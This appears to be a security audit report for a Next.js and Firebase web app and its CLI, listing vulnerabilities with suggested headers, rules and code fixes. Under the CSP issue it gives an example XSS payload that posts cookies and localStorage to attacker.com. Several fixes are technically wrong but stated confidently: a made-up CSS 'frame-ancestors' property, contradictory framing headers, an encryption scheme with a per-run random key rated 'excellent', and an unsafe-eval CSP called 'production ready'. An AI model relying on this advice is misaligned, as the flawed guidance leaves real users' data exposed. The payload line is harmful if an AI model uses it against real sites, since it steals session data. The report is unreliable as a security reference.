# 🔒 Phase 4: Security Hardening

## Security Score: 6/10 (MEDIUM-HIGH RISK)

**Critical Vulnerabilities:** 4  
**High Risk:** 3  
**Medium Risk:** 5  
**Total Issues:** 12

---

## 🚨 CRITICAL SECURITY ISSUES

### Issue #1: Missing Content Security Policy (CSP)
**Risk Level:** 🔴 CRITICAL  
**Impact:** XSS attacks possible  
**CVSS Score:** 7.5 (High)

**Current State:** NO CSP headers

**Attack Vector:**
```html
<!-- Attacker can inject: -->
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      localStorage: localStorage,
      sessionData: /* ... */
    })
  });
</script>
```

**Solution - Implement CSP:**

```json
// firebase.json
{
  "hosting": {
    "headers": [{
      "source": "**",
      "headers": [{
        "key": "Content-Security-Policy",
        "value": "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.googletagmanager.com https://www.google-analytics.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://www.google-analytics.com https://firebaseinstallations.googleapis.com https://firebaselogging-pa.googleapis.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self';"
      }]
    }]
  }
}
```

**Better (Strict CSP):**
```json
{
  "key": "Content-Security-Policy",
  "value": "default-src 'none'; script-src 'self' 'nonce-{RANDOM}' https://www.googletagmanager.com; style-src 'self' 'nonce-{RANDOM}'; img-src 'self' data: https:; font-src 'self'; connect-src 'self' https://*.googleapis.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests;"
}
```

**Implementation:**
```tsx
// middleware.ts (Next.js 14)
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';
import crypto from 'crypto';

export function middleware(request: NextRequest) {
  const nonce = crypto.randomBytes(16).toString('base64');
  
  const cspHeader = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}' 'strict-dynamic' https://www.googletagmanager.com;
    style-src 'self' 'nonce-${nonce}';
    img-src 'self' blob: data: https:;
    font-src 'self';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    frame-ancestors 'none';
    upgrade-insecure-requests;
  `.replace(/\s{2,}/g, ' ').trim();

  const requestHeaders = new Headers(request.headers);
  requestHeaders.set('x-nonce', nonce);
  requestHeaders.set('Content-Security-Policy', cspHeader);

  const response = NextResponse.next({
    request: {
      headers: requestHeaders,
    },
  });

  response.headers.set('Content-Security-Policy', cspHeader);
  
  return response;
}
```

---

### Issue #2: No HTTPS Enforcement (Strict-Transport-Security)
**Risk Level:** 🔴 CRITICAL  
**Impact:** Man-in-the-middle attacks  
**CVSS Score:** 6.5 (Medium-High)

**Current:** HTTP allowed (Firebase handles this, but headers missing)

**Solution:**
```json
{
  "key": "Strict-Transport-Security",
  "value": "max-age=63072000; includeSubDomains; preload"
}
```

**What this does:**
- Forces HTTPS for 2 years
- Applies to all subdomains
- Eligible for browser preload list

---

### Issue #3: Firebase Security Rules NOT AUDITED
**Risk Level:** 🔴 CRITICAL  
**Impact:** Potential data exposure  
**CVSS Score:** 9.1 (CRITICAL)

**Problem:** No Firestore/Auth rules provided in codebase

**Recommended Rules:**

```javascript
// firestore.rules
rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    
    // User profiles - only owner can read/write
    match /users/{userId} {
      allow read: if request.auth != null && request.auth.uid == userId;
      allow write: if request.auth != null && request.auth.uid == userId;
    }
    
    // Analytics events - write-only, no reads
    match /analytics/{event} {
      allow create: if request.auth != null;
      allow read, update, delete: if false;
    }
    
    // Public data (if needed)
    match /public/{document=**} {
      allow read: if true;
      allow write: if false;
    }
    
    // Default: deny everything else
    match /{document=**} {
      allow read, write: if false;
    }
  }
}
```

```javascript
// storage.rules (if using Firebase Storage)
rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    match /user-uploads/{userId}/{allPaths=**} {
      allow read: if request.auth != null;
      allow write: if request.auth != null 
                   && request.auth.uid == userId
                   && request.resource.size < 5 * 1024 * 1024 // 5MB max
                   && request.resource.contentType.matches('image/.*');
    }
    
    match /{allPaths=**} {
      allow read, write: if false;
    }
  }
}
```

**Validation Tool:**
```bash
firebase deploy --only firestore:rules
firebase emulators:start --only firestore
# Test rules in emulator
```

---

### Issue #4: Environment Variables Potentially Exposed
**Risk Level:** 🔴 CRITICAL  
**Impact:** API keys in build output  
**CVSS Score:** 7.8 (High)

**Current Issue:**
```bash
# Found in workspace
.env.local file exists!
```

**Verification Needed:**
```powershell
# Check if .env.local is in .gitignore
git check-ignore .env.local

# Search for API keys in build output
grep -r "FIREBASE_API_KEY" out/
```

**Protection Measures:**

1. **Verify .gitignore:**
```gitignore
# .gitignore
.env
.env*.local
.env.production
```

2. **Use public variables correctly:**
```typescript
// ✅ SAFE - These are meant to be public
const firebaseConfig = {
  apiKey: process.env.NEXT_PUBLIC_FIREBASE_API_KEY,
  projectId: process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID,
};

// ❌ DANGEROUS - Never do this
const secretKey = process.env.FIREBASE_ADMIN_KEY; // Will be exposed in browser!
```

3. **Add runtime validation:**
```typescript
// lib/firebase.ts
const requiredEnvVars = [
  'NEXT_PUBLIC_FIREBASE_API_KEY',
  'NEXT_PUBLIC_FIREBASE_PROJECT_ID',
  'NEXT_PUBLIC_FIREBASE_APP_ID',
];

requiredEnvVars.forEach((varName) => {
  if (!process.env[varName]) {
    throw new Error(`Missing required environment variable: ${varName}`);
  }
});
```

---

## 🟠 HIGH RISK ISSUES

### Issue #5: No Rate Limiting on Frontend
**Risk Level:** 🟠 HIGH  
**Impact:** DDoS, abuse of Firebase quota  
**CVSS Score:** 5.3 (Medium)

**Solution - Client-side Rate Limiting:**
```typescript
// lib/rateLimit.ts
class RateLimiter {
  private requests: Map<string, number[]> = new Map();

  async limit(key: string, maxRequests: number, windowMs: number): Promise<boolean> {
    const now = Date.now();
    const userRequests = this.requests.get(key) || [];
    
    // Remove old requests outside window
    const validRequests = userRequests.filter(
      (timestamp) => now - timestamp < windowMs
    );

    if (validRequests.length >= maxRequests) {
      return false; // Rate limit exceeded
    }

    validRequests.push(now);
    this.requests.set(key, validRequests);
    return true;
  }
}

export const rateLimiter = new RateLimiter();

// Usage
async function logEvent(eventName: string) {
  const canProceed = await rateLimiter.limit(
    `analytics:${eventName}`,
    100, // max 100 requests
    60000 // per minute
  );

  if (!canProceed) {
    console.warn('Rate limit exceeded for', eventName);
    return;
  }

  // Proceed with logging
}
```

---

### Issue #6: No Input Validation/Sanitization
**Risk Level:** 🟠 HIGH  
**Impact:** XSS via user inputs  
**CVSS Score:** 6.1 (Medium)

**Vulnerable Code (future risk):**
```tsx
// If you add user input fields
<input onChange={(e) => setEmail(e.target.value)} />
<div dangerouslySetInnerHTML={{ __html: userContent }} /> {/* NEVER DO THIS */}
```

**Solution:**
```typescript
// lib/sanitize.ts
import DOMPurify from 'isomorphic-dompurify';

export function sanitizeHTML(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href'],
  });
}

export function sanitizeEmail(email: string): string {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    throw new Error('Invalid email format');
  }
  return email.toLowerCase().trim();
}

// Usage
const cleanContent = sanitizeHTML(userInput);
const cleanEmail = sanitizeEmail(emailInput);
```

---

### Issue #7: Missing CSRF Protection
**Risk Level:** 🟠 HIGH  
**Impact:** Cross-site request forgery  
**CVSS Score:** 5.4 (Medium)

**Current:** No forms = Low immediate risk  
**Future Risk:** When adding contact forms, etc.

**Solution:**
```typescript
// lib/csrf.ts
import crypto from 'crypto';

export function generateCSRFToken(): string {
  return crypto.randomBytes(32).toString('hex');
}

export function validateCSRFToken(token: string, sessionToken: string): boolean {
  return crypto.timingSafeEqual(
    Buffer.from(token),
    Buffer.from(sessionToken)
  );
}

// Usage in forms
<form>
  <input type="hidden" name="csrf_token" value={csrfToken} />
  {/* other fields */}
</form>
```

---

## 🟡 MEDIUM RISK ISSUES

### Issue #8: Clickjacking Vulnerability
**Risk Level:** 🟡 MEDIUM  
**Impact:** UI redressing attacks  
**CVSS Score:** 4.3 (Medium)

**Solution:** Already recommended in firebase.json
```json
{
  "key": "X-Frame-Options",
  "value": "SAMEORIGIN"
}
```

**Additional Protection:**
```css
/* Add to globals.css */
html {
  /* Prevent clickjacking via CSS */
  frame-ancestors: 'none';
}
```

---

### Issue #9: No Subresource Integrity (SRI)
**Risk Level:** 🟡 MEDIUM  
**Impact:** CDN compromise  
**CVSS Score:** 4.0 (Medium)

**Current:** Google Analytics loaded without SRI
```tsx
<Script src={`https://www.googletagmanager.com/gtag/js?id=${measurementId}`} />
```

**Note:** Google Analytics intentionally doesn't support SRI (auto-updates)  
**Risk:** Acceptable for Google's CDN  
**Mitigation:** Use CSP to whitelist only trusted domains

---

### Issue #10: Session/Cookie Security
**Risk Level:** 🟡 MEDIUM  
**Impact:** Session hijacking  
**CVSS Score:** 4.2 (Medium)

**Firebase handles this automatically**, but verify:

```typescript
// Ensure secure cookies in production
if (process.env.NODE_ENV === 'production') {
  // Firebase Auth automatically uses secure cookies
  // But verify in Network tab:
  // - Secure flag set
  // - HttpOnly flag set
  // - SameSite=Strict or Lax
}
```

---

## 🛡️ CLI Security (Already Excellent!)

### ✅ What's Already Secure:

1. **API Key Encryption:**
```javascript
// cli/src/config.js
const crypto = require('crypto');
const ENCRYPTION_KEY = crypto.randomBytes(32);
const IV_LENGTH = 16;

function encrypt(text) {
  const iv = crypto.randomBytes(IV_LENGTH);
  const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return iv.toString('hex') + ':' + encrypted;
}

function decrypt(text) {
  const parts = text.split(':');
  const iv = Buffer.from(parts[0], 'hex');
  const encrypted = parts[1];
  const decipher = crypto.createDecipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}
```

**Rating:** ✅ Excellent - AES-256-CBC properly implemented

2. **Config File Permissions:**
```javascript
// Stored in ~/.social-poster/config.json
// Only accessible by user account
```

### ⚠️ CLI Improvements Needed:

1. **Add config file permission check:**
```javascript
const fs = require('fs');
const path = require('path');

function ensureConfigSecurity() {
  const configPath = path.join(os.homedir(), '.social-poster', 'config.json');
  
  // Check file exists
  if (fs.existsSync(configPath)) {
    const stats = fs.statSync(configPath);
    const mode = stats.mode & 0o777;
    
    // Warn if too permissive (not 600 or 400)
    if (mode !== 0o600 && mode !== 0o400) {
      console.warn(chalk.yellow(
        '⚠️  Config file has insecure permissions. Setting to 600...'
      ));
      fs.chmodSync(configPath, 0o600);
    }
  }
}
```

2. **Add prompt history encryption:**
```javascript
// cli/src/config.js - savePromptHistory
function savePromptHistory(prompt) {
  const encrypted = encrypt(prompt); // Encrypt before saving
  const history = loadPromptHistory();
  history.push({ prompt: encrypted, timestamp: Date.now() });
  fs.writeFileSync(PROMPT_HISTORY_FILE, JSON.stringify(history, null, 2));
}
```

---

## 🔐 Complete Security Headers Configuration

```json
// firebase.json - PRODUCTION READY
{
  "hosting": {
    "public": "out",
    "cleanUrls": true,
    "trailingSlash": false,
    "headers": [
      {
        "source": "**",
        "headers": [
          {
            "key": "Content-Security-Policy",
            "value": "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.googletagmanager.com https://www.google-analytics.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' data:; connect-src 'self' https://www.google-analytics.com https://*.googleapis.com https://*.firebaseio.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests;"
          },
          {
            "key": "X-Content-Type-Options",
            "value": "nosniff"
          },
          {
            "key": "X-Frame-Options",
            "value": "SAMEORIGIN"
          },
          {
            "key": "X-XSS-Protection",
            "value": "1; mode=block"
          },
          {
            "key": "Referrer-Policy",
            "value": "strict-origin-when-cross-origin"
          },
          {
            "key": "Permissions-Policy",
            "value": "camera=(), microphone=(), geolocation=()"
          },
          {
            "key": "Strict-Transport-Security",
            "value": "max-age=63072000; includeSubDomains; preload"
          }
        ]
      },
      {
        "source": "**/*.@(jpg|jpeg|gif|png|svg|webp|ico)",
        "headers": [
          {
            "key": "Cache-Control",
            "value": "public, max-age=31536000, immutable"
          }
        ]
      },
      {
        "source": "**/*.@(js|css)",
        "headers": [
          {
            "key": "Cache-Control",
            "value": "public, max-age=31536000, immutable"
          }
        ]
      }
    ],
    "rewrites": [
      {
        "source": "**",
        "destination": "/index.html"
      }
    ]
  }
}
```

---

## 📋 Security Checklist

- [ ] Implement CSP headers
- [ ] Add HSTS headers
- [ ] Deploy Firestore security rules
- [ ] Verify .env.local in .gitignore
- [ ] Add rate limiting
- [ ] Implement input sanitization
- [ ] Add CSRF protection for forms
- [ ] Setup error tracking (Sentry)
- [ ] Encrypt prompt history in CLI
- [ ] Add security.txt file
- [ ] Setup dependency scanning (Dependabot)
- [ ] Regular security audits

---

## 🎯 Priority Implementation Order

1. **Immediate** (Today):
   - Update firebase.json with security headers
   - Verify .gitignore includes .env files
   - Deploy Firestore rules

2. **This Week**:
   - Add rate limiting
   - Implement CSP nonces
   - Add input sanitization utilities

3. **This Month**:
   - Setup Sentry error tracking
   - Implement CSRF protection
   - Security penetration testing

---

**Estimated Time to Secure:** 12-16 hours  
**Risk Reduction:** HIGH → LOW
